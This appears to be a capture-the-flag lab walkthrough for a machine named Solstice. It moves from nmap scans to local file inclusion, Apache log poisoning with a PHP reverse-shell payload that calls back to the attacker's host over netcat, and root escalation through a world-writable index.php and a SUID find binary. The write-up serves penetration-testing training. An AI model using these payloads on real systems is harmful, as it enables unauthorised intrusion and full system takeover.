### Solstice

Machine IP: 192.168.189.72
Difficuly: Easy



### Summary
We can exploit this machine by combining an LFI with a log poisoning attack, then escalate using a world-writable file.


## Enumeration

### Nmap Scanning

```bash
$  nmap -sC -sV -oA nmap/initial 192.168.189.72
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 03:38 EDT
Nmap scan report for 192.168.189.72
Host is up (0.10s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.189.72:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)
|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)
|_  256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)
25/tcp   open  smtp       Exim smtpd
| smtp-commands: solstice Hello nmap.scanme.org [192.168.49.189], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
2121/tcp open  ftp        pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drws------   2 www-data www-data     4096 Jun 18  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.189.72:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.23 seconds
```
- All ports

```bash
kali@kali:~$ sudo nmap -p- -sV 192.168.120.167
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 16:27 EDT
Nmap scan report for 192.168.120.167
Host is up (0.043s latency).
Not shown: 65428 closed ports, 96 filtered ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         pyftpdlib 1.5.6
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp    open  smtp        Exim smtpd 4.92
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
3128/tcp  open  http-proxy  Squid http proxy 4.6
8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
62524/tcp open  ftp         FreeFloat ftpd 1.00
Service Info: Host: solstice; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
```

__Web server on port 8593__

This web app appears to be under construction, with only a limited number of functionalities available to us.

```bash
kali@kali:~$ curl http://192.168.120.167:8593
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p></p>    </body>
</html>
```

By performing manual fuzzing, we’ll find an LFI vulnerability in the book parameter, allowing us to review the contents of `/etc/passwd`.

```bash
kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../etc/passwd
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:107:118::/var/lib/saned:/usr/sbin/nologin
colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false
miguel:x:1000:1000:,,,:/home/miguel:/bin/bash
uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin
smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin
</p>    </body>
</html>
```

__Web Server On Port 80__
Having successfully exploited one application’s LFI vulnerability, let’s attempt to poison the log file of the web application running on port 80. We can achieve this by sending a malicious PHP command to the web application.

```bash
kali@kali:~$ echo "GET <?php echo 'TEST123' ?> HTTP/1.1" | nc 192.168.120.167 80
HTTP/1.1 400 Bad Request
Date: Tue, 11 Aug 2020 21:16:09 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
```

- Next, we’ll use the LFI to verify whether our attack worked.

```bash
kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p>192.168.118.9 - - [11/Aug/2020:17:16:09 -0400] "GET TEST123 HTTP/1.1\n" 400 0 "-" "-"
</p>    </body>
</html>
```

- We’ll observe that the php code was executed. We can leverage this to execute commands.


## Exploitation

### Log Poisoning

Let’s use the log poisoning attack to inject our payload.

```bash
kali@kali:~$ echo "GET <?php system('nc -e /bin/bash 192.168.118.9 444'); ?> HTTP/1.1" | nc 192.168.120.167 80
```

First, we’ll start our listener.

```bash
kali@kali:~$ sudo nc -nvlp 444
listening on [any] 444 ...
```
Next, we trigger our payload using the LFI.

```bash
kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log
```
We receive our shell.

```bash
kali@kali:~$ sudo nc -nvlp 444
listening on [any] 444 ...
connect to [192.168.118.9] from (UNKNOWN) [192.168.120.167] 52810
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

python -c "import pty; pty.spawn('/bin/bash')"
www-data@solstice:/var/tmp/webserver$

www-data@solstice:/var/tmp/webserver$ stty rows 50 cols 250
stty rows 50 cols 250
```

## Escalation
If we review the running processes, we’ll find a local web server running as root.

```bash
www-data@solstice:/var/tmp/webserver$ ps aux
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root       474  0.0  0.0   2388   756 ?        Ss   Aug11   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
...
root       480  0.0  2.0 196744 21104 ?        S    Aug11   0:01 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
...
```

Within the web server’s root folder, we’ll notice the index.php file is world-writable.

```bash
www-data@solstice:/var/tmp/webserver$ ls -l /var/tmp/sv
ls -l /var/tmp/sv
total 4
-rwxrwxrwx 1 root root 36 Jun 19 00:01 index.php
```

We can use this file to execute commands as root. Let’s run find with the SUID bit.

```bash
www-data@solstice:/var/tmp/webserver$ echo "<?php system('chmod +s /usr/bin/find'); ?>" > /var/tmp/sv/index.php
echo "<?php system('chmod +s /usr/bin/find'); ?>" > /var/tmp/sv/index.php

www-data@solstice:/var/tmp/webserver$ curl localhost:57
curl localhost:57

www-data@solstice:/var/tmp/webserver$ ls -l /usr/bin/find
ls -l /usr/bin/find
-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
```

We can then use find to escalate our shell.

```bash
www-data@solstice:/var/tmp/webserver$ find . -exec /bin/bash -p \; -quit
find . -exec /bin/bash -p \; -quit
bash-5.0# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

